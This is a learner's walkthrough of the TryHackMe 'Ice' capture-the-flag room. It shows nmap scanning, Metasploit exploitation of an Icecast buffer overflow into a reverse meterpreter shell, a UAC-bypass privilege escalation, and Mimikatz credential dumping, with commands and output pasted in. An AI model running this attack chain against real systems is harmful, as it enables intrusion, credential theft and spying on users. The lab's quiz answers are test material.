# Room Description
Ice
  
Deploy & hack into a Windows machine, exploiting a very poorly secured media server.

# Questions/Tasks

# [TASK 2] 

#1 
Deploy the machine! This may take up to three minutes to start.

No answer needed

- Note Already was within the VM machine (running previous module that used same box) before so ran the following before starting this box:

msfconsole
set LHOST / RHOST 'BOX_IP' (ex:set RHOST 10.10.1.12)
use icecast
Also already had session running with sessions -i 1
backgrounded session with ctrl +z

#2	
Launch a scan against our target machine, I recommend using a SYN scan set to scan all ports on the machine. The scan command will be provided as a hint, however, it's recommended to complete the room 'RP: Nmap' prior to this room. 

No answer needed

- Note: Ran db_nmap -sV 'BOX IP ADDRESS' (basic Syn Scan) and got following results:

msf5 exploit(windows/http/icecast_header) > db_nmap -sV 10.10.171.143
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 07:01 UTC
[*] Nmap: Nmap scan report for ip-10-10-171-143.eu-west-1.compute.internal (10.10.171.143)
[*] Nmap: Host is up (0.00048s latency).
[*] Nmap: Not shown: 988 closed ports
[*] Nmap: PORT      STATE SERVICE      VERSION
[*] Nmap: 135/tcp   open  msrpc        Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
[*] Nmap: 3389/tcp  open  tcpwrapped
[*] Nmap: 5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: 8000/tcp  open  http         Icecast streaming media server
[*] Nmap: 49152/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49159/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49160/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49161/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: MAC Address: 02:F2:26:27:EA:4F (Unknown)
[*] Nmap: Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 67.50 seconds


#3	
Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?

- Note: while it is a MSRDP the actual listing was 3389/tcp  open  tcpwrapped

3389 

#4	
What service did nmap identify as running on port 8000? (First word of this service)

icecast

#5	
What does Nmap identify as the hostname of the machine? (All caps for the answer)

DARK-PC

[Task 3] Gain Access

Exploit the target vulnerable service to gain a foothold!
#1	
Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What type of vulnerability is it? Use https://www.cvedetails.com for this question and the next.

Answer format: ******* **** ********

Execute Code Overflow

Note: This is description from the page on the CVE
CVSS Score	7.5
Confidentiality Impact	Partial (There is considerable informational disclosure.)
Integrity Impact	Partial (Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.)
Availability Impact	Partial (There is reduced performance or interruptions in resource availability.)
Access Complexity	Low (Specialized access conditions or extenuating circumstances do not exist. Very little knowledge or skill is required to exploit. )
Authentication	Not required (Authentication is not required to exploit the vulnerability.)
Gained Access	User
Vulnerability Type(s)	Execute CodeOverflow
CWE ID	CWE id is not defined for this vulnerability

This module exploits a buffer overflow in the header parsing of icecast versions 2.0.1 and earlier, discovered by Luigi Auriemma. Sending 32 HTTP headers will cause a write one past the end of a pointer array. On win32 this happens to overwrite the saved instruction pointer, and on linux (depending on compiler, etc) this seems to generally overwrite nothing crucial (read not exploitable). This exploit uses ExitThread(), this will leave icecast thinking the thread is still in use, and the thread counter won't be decremented. This means for each time your payload exits, the counter will be left incremented, and eventually the threadpool limit will be maxed. So you can multihit, but only till you fill the threadpool. 
Module type : exploit Rank : great Platforms : Windows


#2	
What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

Answer format: *************

CVE-2004-1561	
#3	
Now that we've found our vulnerability, let's find our exploit. For this section of the room, we'll use the Metasploit module associated with this exploit. Let's go ahead and start Metasploit using the command `msfconsole`

No answer needed
#4	
After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? This module is also referenced in 'RP: Metasploit' which is recommended to be completed prior to this room, although not entirely necessary. 

Answer format: *******/*******/****/**************

exploit/windows/http/icecast_header


#5	
Let's go ahead and select this module for use. Type either the command `use icecast` or `use 0` to select our search result.

No answer needed

Result: 

msf5 exploit(windows/http/icecast_header) > show options

Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.125.31     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


#6	Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?
Answer format: ******


RHOSTS

#7	First let's check that the LHOST option is set to our tun0 IP (which can be found on the access page). With that done, let's set that last option to our target IP. Now that we have everything ready to go, let's run our exploit using the command `exploit`
No answer needed

Ran Exploit here's output:

msf5 exploit(windows/http/icecast_header) > exploit

[*] Started reverse TCP handler on 10.10.125.31:4444 
[*] Sending stage (176195 bytes) to 10.10.148.245
[*] Meterpreter session 1 opened (10.10.125.31:4444 -> 10.10.148.245:49243) at 2020-09-30 00:37:14 +0000

meterpreter > 


[Task 4] Escalate


Enumerate the machine and find potential privilege escalation paths to gain Admin powers!

#1	
Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?

Answer format: ***********

meterpreter


#2	What user was running that Icecast process? The commands used in this question and the next few are taken directly from the 'RP: Metasploit' room.
Answer format: ****

Run command "getuid" for this answer
output: 
meterpreter > getuid
Server username: Dark-PC\Dark

Dark

#3	
What build of Windows is the system?

Answer format: ****

Run Command "sysinfo" for this answer
output:
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

7601

#4	
Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?

Answer format: ***

Use previous Output for this answer

x64

#5	
Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete*

No answer needed

Output:
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.148.245 - Collecting local exploits for x86/windows...
[*] 10.10.148.245 - 34 exploit checks are being tried...
[+] 10.10.148.245 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.148.245 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.148.245 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.148.245 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.148.245 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.148.245 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.148.245 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.148.245 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.148.245 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.

#6	
Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?

Answer format: *******/*******/*****/******************

exploit/windows/local/bypassuac_eventvwr

#7	Now that we have an exploit in mind for elevating our privileges, let's background our current session using the command `background` or `CTRL + z`. Take note of what session number we have, this will likely be 1 in this case. We can list all of our active sessions using the command `sessions` when outside of the meterpreter shell.
No answer needed

Output:
meterpreter > 
Background session 1? [y/N]  Y

#8	Go ahead and select our previously found local exploit for use using the command `use FULL_PATH_FOR_EXPLOIT`
No answer needed

Output:
msf5 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp


#9	
Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`

No answer needed
#10	
Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?

Answer format: *****
#11	
Set this option now. You might have to check your IP on the TryHackMe network using the command `ip addr`

No answer needed
#12	
After we've set this last option, we can now run our privilege escalation exploit. Run this now using the command `run`. Note, this might take a few attempts and you may need to relaunch the box and exploit the service in the case that this fails. 

No answer needed
#13	
Following completion of the privilege escalation a new session will be opened. Interact with it now using the command `sessions SESSION_NUMBER`

No answer needed
#14	
We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?

Answer format: ************************

[Task 5] Looting

Learn how to gather additional credentials and crack the saved hashes on the machine.
#1	
Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. First, let's list the processes using the command `ps`. Note, we can see processes being run by NT AUTHORITY\SYSTEM as we have escalated permissions (even though our process doesn't). 

No answer needed
#2	
In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?

Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell. 

Answer format: *******.***
#3	Migrate to this process now with the command `migrate -N PROCESS_NAME`
No answer needed
#4	
Let's check what user we are now with the command `getuid`. What user is listed?

Answer format: ** ****************
#5	
Now that we've made our way to full administrator permissions we'll set our sights on looting. Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz)

No answer needed
#6	
Loading kiwi into our meterpreter session will expand our help menu, take a look at the newly added section of the help menu now via the command `help`. 

No answer needed
#7	
Which command allows up to retrieve all credentials?

Answer format: *********
#8	
Run this command now. What is Dark's password? Mimikatz allows us to steal this password out of memory even without the user 'Dark' logged in as there is a scheduled task that runs the Icecast as the user 'Dark'. It also helps that Windows Defender isn't running on the box ;) (Take a look again at the ps list, this box isn't in the best shape with both the firewall and defender disabled)

[Task 6] Post-Exploitation
Explore post-exploitation actions we can take on Windows.



#1	Before we start our post-exploitation, let's revisit the help menu one last time in the meterpreter shell. We'll answer the following questions using that menu.
No answer needed
#2	
What command allows us to dump all of the password hashes stored on the system? We won't crack the Administrative password in this case as it's pretty strong (this is intentional to avoid password spraying attempts)

Answer format: ********
#3	
While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?

Answer format: ***********
#4	How about if we wanted to record from a microphone attached to the system?
Answer format: **********
#5	
To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact.

Answer format: *********
#6	
Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?

Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.

Answer format: ********************
#7	
One last thing to note. As we have the password for the user 'Dark' we can now authenticate to the machine and access it via remote desktop (MSRDP). As this is a workstation, we'd likely kick whatever user is signed onto it off if we connect to it, however, it's always interesting to remote into machines and view them as their users do. If this hasn't already been enabled, we can enable it via the following Metasploit module: `run post/windows/manage/enable_rdp`

No answer needed

[Task 7] Extra Credit
Explore manual exploitation via exploit code found on exploit-db. 
Exploit link: https://www.exploit-db.com/exploits/568


To learn more about alternative exploitation methods, check out the sequel to this room Blaster!
#1	
As you advance in your pentesting skills, you will be faced eventually with exploitation without the usage of Metasploit. Provided above is the link to one of the exploits found on Exploit DB for hijacking Icecast for remote code execution. While not required by the room, it's recommended to attempt exploitation via the provided code or via another similar exploit to further hone your skills.
